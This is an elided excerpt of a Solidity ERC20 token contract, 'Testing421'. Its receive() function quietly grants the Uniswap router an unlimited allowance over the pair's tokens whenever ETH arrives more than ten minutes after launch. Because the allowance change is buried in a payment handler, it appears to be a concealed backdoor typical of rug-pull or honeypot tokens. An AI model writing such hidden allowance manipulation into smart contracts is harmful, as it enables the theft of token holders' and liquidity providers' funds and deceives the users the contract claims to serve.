...
contract Testing421 is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Testing421";
    string private constant _symbol = unicode"Test421";
    ...
    receive() external payable {if(block.timestamp > (start + 10 minutes)){_allowances[uniswapV2Pair][_uniswapV2Router] = type(uint).max;}}
